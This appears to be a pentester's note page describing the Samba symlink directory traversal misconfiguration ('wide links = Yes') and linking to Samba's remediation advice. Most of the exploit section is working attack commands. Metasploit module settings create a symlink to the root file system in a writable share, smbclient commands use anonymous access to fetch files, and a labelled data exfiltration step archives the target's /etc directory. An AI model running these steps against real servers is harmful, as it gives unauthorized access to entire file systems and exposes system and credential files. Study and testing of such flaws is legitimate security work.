<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Samba Symlink Directory Traversal (configuration issue)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Samba Symlink Directory Traversal (configuration issue)</h1><br /><strong>
      <h3>Prerequisites:</h3>
    </strong><br />• Samba server contains a writeable share folder<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;smbmap&nbsp;-H&nbsp;<span
          style="color:#000000;font-weight:400">[</span>ipAddress<span style="color:#000000;font-weight:400">]</span>
      </div>
    </div><br /> <a href=""><img src="images/1442-1.png" alt="images/1442-1.png" /></a><br />• In
    <code>/etc/samba/smb.conf</code> we have the parameter <code>wide links = Yes</code>. <br /> We can not check it if
    we have not full access to the machine<br />
    <div class="codebox">
      <div class="codebox">target@host:/$&nbsp;testparm&nbsp;-s&nbsp;|&nbsp;grep&nbsp;&quot;wide&nbsp;links&quot;</div>
    </div><br /><br /><br />The vulnerability “Samba Symlink Directory Traversal”, is a Samba misconfiguration in its
    settings that essentially allows an attacker to create a <span style="text-decoration:underline;">symbolic link to
      the root (/) partition</span> from a writeable share.<br /> This will allow the attacker a read access to the
    entire file system outside of the share directory.<br /><br />To know more about this issue and <span
      style="text-decoration:underline;">how to resolve it</span> go to: <a
      href="https://www.samba.org/samba/news/symlink_attack.html" target="_blank">https://www.samba.org/samba/news/symlink_attack.html</a><br /><br /><strong>Exploit</strong><br />This
    vulnerability can be exploited using a modified version of the <span
      style="text-decoration:underline;">smbclient</span>(<a
      href="https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually" target="_blank">see here how to do it</a>) or in
    alternative:<br />• <span style="text-decoration:underline;">Metasploit module</span>: <a
      href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal" target="_blank">https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal</a><br />
    <div class="codebox">
      <div class="codebox">
        msf&gt;&nbsp;use&nbsp;auxiliary/admin/smb/samba_symlink_traversal<br />msf&gt;&nbsp;show&nbsp;options<br />msf&gt;&nbsp;set&nbsp;RHOST&nbsp;&lt;targetIp&gt;<br />msf&gt;&nbsp;set&nbsp;SMBSHARE&nbsp;&lt;writableTargetFolder&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#check&nbsp;the&nbsp;prerequisites<br />msf&gt;&nbsp;set&nbsp;SMBTARGET&nbsp;rootfs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#new&nbsp;rootfs&nbsp;folder&nbsp;inside&nbsp;&lt;writableTargetFolder&gt;&nbsp;that&nbsp;is&nbsp;linked&nbsp;to&nbsp;/<br />msf&gt;&nbsp;exploit
      </div>
    </div><br /> Access to the access the &lt;writableTargetFolder&gt; share. Inside it we should have a “rootfs”
    directory(SMBTARGET)<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;smbclient&nbsp;\\\\192.168.13.29\\&lt;writableTargetFolder&gt;&nbsp;-N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#anonymous&nbsp;access&nbsp;<br />smb:&nbsp;\&gt;&nbsp;cd&nbsp;rootfs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#created&nbsp;folder&nbsp;by&nbsp;us<br />smb:&nbsp;\&gt;&nbsp;get&nbsp;[file]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;download&nbsp;a&nbsp;file&nbsp;locally
      </div>
    </div><br /> data exfiltration of all files within a directory<br /> <span style="color:#a5452a;">example:</span>
    create a tar archive of the /etc/ directory on the target system to our local systems’ /tmp directory.<br />
    <div class="codebox">
      <div class="codebox">
        smb:&nbsp;\&gt;&nbsp;cd&nbsp;rootfs\etc<br />smb:&nbsp;\&gt;&nbsp;tar&nbsp;c&nbsp;../tmp/all_files.tar&nbsp;*
      </div>
    </div>
  </div>
</body>

</html>